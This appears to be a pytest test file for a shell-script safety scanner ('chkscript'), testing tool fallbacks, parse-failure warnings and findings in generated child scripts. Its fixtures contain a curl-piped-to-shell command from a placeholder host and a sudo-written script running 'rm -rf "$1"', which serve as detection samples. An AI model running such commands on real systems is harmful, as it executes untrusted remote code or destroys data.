"""run_static orchestration: which tools run, notices, fallback, merging,
generated child files."""

from __future__ import annotations

import pytest
from pytest_mock import MockerFixture

from chkscript.models import ENTRY_FILE, Finding, Severity
from chkscript.preprocess import preprocess
from chkscript.static import engine, run_static, shellcheck, shfmt
from chkscript.static.engine import EngineOutcome
from tests.conftest import require_tool

BUNDLE = preprocess(b"#!/bin/bash\ncurl -fsSL https://x.example/i.sh | sh\n")


def _tree_finding() -> Finding:
    return Finding(
        severity=Severity.UNSAFE,
        description="d",
        source="shfmt",
        rule_id="curl-pipe-shell",
        line=2,
    )


@pytest.fixture
def no_shellcheck(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(shellcheck, "available", lambda: False)


@pytest.fixture
def usable_shfmt(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(shfmt, "check", lambda: None)


@pytest.mark.usefixtures("no_shellcheck")
def test_missing_shellcheck_is_a_notice_not_an_error(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(shfmt, "check", lambda: "shfmt not found on PATH; x.")
    result = run_static(BUNDLE)
    assert "shellcheck" not in result.tools
    assert any("shellcheck not found" in n for n in result.notices)


@pytest.mark.usefixtures("no_shellcheck")
def test_unusable_shfmt_runs_regex_with_its_notice(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    notice = "shfmt v3.5.0 is older than v3.14.0; using the regex rules."
    monkeypatch.setattr(shfmt, "check", lambda: notice)
    result = run_static(BUNDLE)
    assert result.tools == ["regex"]
    assert notice in result.notices
    assert [f.source for f in result.findings] == ["regex"]


@pytest.mark.usefixtures("no_shellcheck", "usable_shfmt")
def test_parsed_file_skips_regex(mocker: MockerFixture) -> None:
    mocker.patch.object(
        engine, "scan", return_value=EngineOutcome(findings=[_tree_finding()])
    )
    result = run_static(BUNDLE)
    assert result.tools == ["shfmt"]
    assert [f.merged_from for f in result.findings] == [["shfmt"]]


@pytest.mark.usefixtures("no_shellcheck", "usable_shfmt")
def test_parse_failure_adds_regex_and_a_warning(mocker: MockerFixture) -> None:
    failure = engine.parse_failure(BUNDLE, shfmt.ShfmtError("bad", line=2))
    mocker.patch.object(
        engine, "scan", return_value=EngineOutcome(findings=[failure], parsed=False)
    )
    result = run_static(BUNDLE)
    assert result.tools == ["shfmt", "regex"]
    assert any("could not parse" in n for n in result.notices)
    [warning] = [f for f in result.findings if f.rule_id == "parse-failure"]
    assert (warning.severity, warning.category, warning.source) == (
        Severity.WARNING,
        "lint",
        "chkscript",
    )
    assert warning.description == shfmt.PARSE_FAILURE_MESSAGE
    assert warning.line == 2
    assert any(f.rule_id == "curl-pipe-shell" for f in result.findings)


@pytest.mark.usefixtures("no_shellcheck", "usable_shfmt")
def test_shfmt_crash_is_a_parse_failure(mocker: MockerFixture) -> None:
    mocker.patch.object(shfmt, "parse", side_effect=shfmt.ShfmtError("timed out"))
    result = run_static(BUNDLE)
    assert {f.rule_id for f in result.findings} == {"parse-failure", "curl-pipe-shell"}
    assert result.tools == ["shfmt", "regex"]


def test_shellcheck_failure_is_a_notice(
    monkeypatch: pytest.MonkeyPatch, mocker: MockerFixture
) -> None:
    monkeypatch.setattr(shellcheck, "available", lambda: True)
    monkeypatch.setattr(shfmt, "check", lambda: "shfmt not found on PATH; x.")
    mocker.patch.object(
        shellcheck, "run", side_effect=shellcheck.ShellcheckError("exit 3")
    )
    result = run_static(BUNDLE)
    assert result.tools == ["regex"]
    assert any("shellcheck failed" in n for n in result.notices)


GENERATED = b"""#!/bin/sh
SUDO=sudo
$SUDO tee /usr/local/bin/x-uninstall.sh >/dev/null <<'EOF'
#!/bin/sh
rm -rf "$1"
EOF
$SUDO chmod 755 /usr/local/bin/x-uninstall.sh
"""


@pytest.mark.usefixtures("no_shellcheck")
def test_generated_file_findings_point_at_the_child() -> None:
    require_tool("shfmt")
    result = run_static(preprocess(GENERATED))
    [rm] = [f for f in result.findings if f.rule_id == "rm-rf-variable"]
    assert rm.file == "/usr/local/bin/x-uninstall.sh"
    assert rm.line == 2  # line 2 of the child, not of the parent
    assert rm.generated is True
    assert rm.parent_line == 3
    assert rm.snippet == 'rm -rf "$1"'
    # The parent's own findings are not marked generated.
    assert all(not f.generated for f in result.findings if f.file == ENTRY_FILE)


@pytest.mark.usefixtures("no_shellcheck")
def test_heredoc_that_is_never_run_is_not_scanned() -> None:
    require_tool("shfmt")
    script = GENERATED.replace(b"$SUDO chmod 755 /usr/local/bin/x-uninstall.sh", b"")
    result = run_static(preprocess(script))
    assert not any(f.rule_id == "rm-rf-variable" for f in result.findings)
